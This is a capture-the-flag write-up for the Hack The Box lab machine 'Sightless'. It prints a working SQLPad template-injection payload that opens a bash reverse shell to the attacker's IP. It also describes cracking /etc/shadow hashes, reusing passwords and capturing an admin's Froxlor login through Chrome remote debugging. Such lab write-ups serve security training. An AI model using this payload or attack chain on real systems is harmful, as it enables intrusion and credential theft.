
# Sightless Writeup

**IP:** 10.10.11.32  
**/etc/hosts:** sightless.htb  
**Difficulty:** Easy  
**OS:** Linux

## Recon

I visited the IP address in my browser and was redirected to `sightless.htb`. I added this to my host files and continued inspecting the website. Before diving into that, I started an Nmap scan on the IP address:

```bash
rustscan -a 10.10.11.32 -- -sC -sV -oN nmap
```
I also initiated a directory search using Dirsearch:
```bash
dirsearch -u http://sightless.htb/
```
Next, I opened Burp Suite and started proxying the traffic through it.

Back on the site, I browsed through the content looking for interesting information. I came across a button labeled "SQLPad" that led to a subdomain: `sqlpad.sightless.htb`. I added this subdomain to my host files for further investigation.


![2024-09-08_09-04](https://github.com/user-attachments/assets/924427a2-bb38-4f0e-a53c-1f40bec07277)

 
 During this time my initia scan finished 
nmap result
  
```bash  
  PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  ftp
| ssl-cert: Subject: commonName=sightless.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Issuer: commonName=sightless.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Public Key type: ec
| Public Key bits: 521
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2024-05-15T18:55:27
| Not valid after:  2034-05-13T18:55:27
| MD5:   45b3 063e 4c40 65b0 8e95 b42a 1415 6ee2
| SHA-1: a14b 9593 0acf 15cd dd52 68ed db5b 92ed f0f3 3c69
| -----BEGIN CERTIFICATE-----
| MIICljCCAfigAwIBAgIUGXwUUI02BlpNCIZ+e1D647P7ubswCgYIKoZIzj0EAwIw
| XTELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGElu
| dGVybmV0IFdpZGdpdHMgUHR5IEx0ZDEWMBQGA1UEAwwNc2lnaHRsZXNzLmh0YjAe
| Fw0yNDA1MTUxODU1MjdaFw0zNDA1MTMxODU1MjdaMF0xCzAJBgNVBAYTAlVTMRMw
| EQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0
| eSBMdGQxFjAUBgNVBAMMDXNpZ2h0bGVzcy5odGIwgZswEAYHKoZIzj0CAQYFK4EE
| ACMDgYYABAEEHbLtjQhs5zp9AEzvBo1Ccv45RD1jcHkJMf8YljHfS3N/HBfwPnBm
| 2eZ/rlAaUnz61w9Qlh6jB4oYI3D6YgG/MACv1SwCWDr1GMu8BGBWNDZbr+9L/n/q
| 5v73kVM/idWblfWrJUkNOq71RGmcxth1pUQKwE5Cv6bUIfe3FM6nRUuoSqNTMFEw
| HQYDVR0OBBYEFIK1f/mkHmlvDa/2If2Rn3lFyeY6MB8GA1UdIwQYMBaAFIK1f/mk
| HmlvDa/2If2Rn3lFyeY6MA8GA1UdEwEB/wQFMAMBAf8wCgYIKoZIzj0EAwIDgYsA
| MIGHAkFMZHZex+fVSUV1UKn6OqQ3Lj6vOv737HE5q6GRVN8MDfrUCokBY4SolaG0
| lN5Jql5wknndFnaW5HxcPvU2G8JVygJCASuklQ/e+4wLGgH94pyF3/YyhXGLiAZB
| btCMnLv7bIv9fKn8EiE1Bg7GXlHMAoOpLkMmdkTq517NDVgdSpawcrx9
|_-----END CERTIFICATE-----
| tls-nextprotoneg: 
|_  ftp
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Sightless.htb
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=9/8%Time=66DD5C85%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Serv
SF:er\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20be
SF:ing\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 21 is open which is for ftp, i tried anonymous login which didnt work, i'll come back to this later

### dirsearch result
Dirsearch revealed a directory:
  ```bash
dirsearch -u http://sightless.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/mofe/files/htb/sightless/reports/http_sightless.htb/__24-09-08_09-13-46.txt

Target: http://sightless.htb/

[09:13:46] Starting:                                                             
[09:16:11] 403 -  564B  - /images/                                          
[09:16:11] 301 -  178B  - /images  ->  http://sightless.htb/images/         
                                                                             
Task Completed  
```
The /images directory returned a "403 Forbidden" response.

## SQLPad Exploitation

On the `sqlpad.sightless.htb` page, I encountered a web application called SQLPad. According to the documentation, SQLPad is a web app for writing and running SQL queries and visualizing the results. It supports various drivers such as Postgres, MySQL, SQL Server, and many others via ODBC. You can refer to the documentation [here](https://getsqlpad.com/en/connections/).

I looked up known vulnerabilities and found CVE-2022-0944, which describes a critical vulnerability in SQLPad versions up to 6.10.0. This vulnerability is due to an injection flaw classified as CWE-74 (Improper Neutralization of Special Elements used in a Command). The issue arises from SQLPad’s failure to properly neutralize special characters in input that influences command construction, potentially leading to unintended command execution or data manipulation. More details can be found [here](https://vuldb.com/?id.194925).

### Exploitation

I spent some time trying to understand and exploit this vulnerability. After some trial and error with various payloads, several internal server error 500, i finally got one that worked

![2024-09-08_11-33](https://github.com/user-attachments/assets/73590400-7a76-45f5-8d1e-68f13a7faec2)


1. **Create a New Connection:**
   - **Name:** `test`
   - **Driver:** `mysql`
   - **Database Name Field:** This is the field where we need to inject the payload.

2. **Payload:**
   - Use the following payload in the database name field:
     ```plaintext
     {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.19/4444 0>&1"') }}
     ```
   - Replace `10.10.14.19` with your own IP address.

3. **Setup Listener:**
   - Set up a listener on your machine to catch the reverse shell.

4. **Test the Connection:**
   - Click on the "Test" button to trigger the payload.

After setting up the listener and testing the connection, I received a reverse shell on my listener.



## Initial Discovery

Gained shell access as root and quickly realized the environment was a Docker container. Not what was expected for an easy box.

## Discovering Other Users

Noticed there were other users on the host: `micheal` and `node`. With root access, checked out `/etc/shadow` and saw that `node` didn’t have a password (`!`),.

## Cracking Passwords

Copied the root and `micheal` user hashes from `/etc/shadow`. Used `hashcat` to crack the passwords:

```bash
hashcat -m 1800 hash ~/tools/rockyou.txt
```
A few minutes later, both passwords were cracked. 


![2024-09-08_12-03](https://github.com/user-attachments/assets/fe499622-4578-4e18-b5a9-1e87128a3acd)

Tried micheal's password with SSH to 10.10.11.32:
This worked and got access outside the Docker container. Found the user.txt flag.

## New Host and User Discovery

On the new host, there are three users:

```bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
michael:x:1000:1000:michael:/home/michael:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
```
After checking usual folders without much success,i ran linpeas. It revealed some new subdomains: admin.sightless.htb and web1.sightless.htb. Accessing both of these subdomains redirected back to sightless.htb.

Active Ports

but on the other hand there are some interesting active ports:

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43481         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39205         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34673         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
```
this looks promising, i started to 8080 since it's usually a web service port, i tested it with curl and got some data back 
```bash
curl http://127.0.0.1:8080
<!DOCTYPE html>
<html lang="en" data-bs-theme="light">
<head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex, nofollow, noarchive"/>
        <meta name="googlebot" content="nosnippet"/>
        <link rel="icon" type="image/x-icon" href="templates/Froxlor/assets/img/icon.png">
        <meta name="csrf-token" content="dcf69acdf251a256220aab9bbe21e707cc0f23c8" />
        <!-- Assets  -->
        <link rel="stylesheet" href="templates/Froxlor/build/assets/app-61450a15.css">
        <script src="templates/Froxlor/build/assets/app-67d6acee.js" type="module"></script>
snip---
```
so i set up port forwarding to view the webpage in a browser
```bash
ssh -L 8080:127.0.0.1:8080 micheal@10.10.11.32
```
Accessed 127.0.0.1:8080 and saw a Froxlor webpage, it was a login form
![foxfor](https://github.com/user-attachments/assets/4ce2d526-67d6-46ba-b04b-1aa5a7d228a1)

## Accessing the System Further

After trying all available credentials (both `michael` and `root` with different usernames) without success.

### Exploring Vulnerabilities

I searched online for Froxlor vulnerabilities, but the available RCE exploits were all authenticated, which we did not have. SQL injection attempts also seemed unlikely to work.

### Revisiting Linpeas Output

Going back to the `linpeas` scan, I re-examined the results and noticed a command run by the user `john`:
```bash
/opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.vjEYUV data:,
```

This command runs Chrome with various debugging and automation options enabled. Such a setup is typically used for automated testing or scripting, where a graphical user interface is not required. The configuration also includes options for remote debugging.

### Finding a Solution

Researching Chrome Remote Debugging led me to a [relevant exploitation guide](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/).

I then launched Google Chrome to test this further:

1. **Port Forwarding**: Made sure to forward the necessary internal ports:


2. **Accessing Remote Debugging**: Opened Chrome and navigated to `chrome://inspect/#devices`.

3. **Configure Ports**: Clicked on "Configure" and added all the internal ports discovered to ensure all potential access points were covered.

4. **Inspecting Froxlor**: Went to the "Pages" section and clicked "Inspect" on the Froxlor interface.

By following these steps, I was able to leverage Chrome’s remote debugging capabilities to gain further insight and potentially identify a way forward.

## Port Forwarding and Remote Debugging

To fully explore the internal services, I forwarded several ports from the remote host to my local machine:

```bash
ssh -L 8080:127.0.0.1:8080 \
    -L 38607:127.0.0.1:38607 \
    -L 40365:127.0.0.1:40365 \
    -L 3306:127.0.0.1:3306 \
    -L 3000:127.0.0.1:3000 \
    -L 80:127.0.0.1:80 \
    -L 33729:127.0.0.1:33729 \
    -L 33060:127.0.0.1:33060 \
    michael@10.10.11.32
```
I used this method because the debugging port changes periodically. When forwarding these ports, it’s crucial to add them to your Chrome target discovery hosts quickly as it switches to a new port.

Monitoring Traffic
After port forwarding, I began monitoring the traffic on the debug port. On my second attempt, I observed that the admin was typing their password
from inspect elements i was able to read the creds this ia a fun one


###Logging In on froxlor

Using the captured credentials, I logged in and accessed the dashboard.

Now that we have valid credentials, I can proceed to try the authenticated exploits we reviewed earlier.







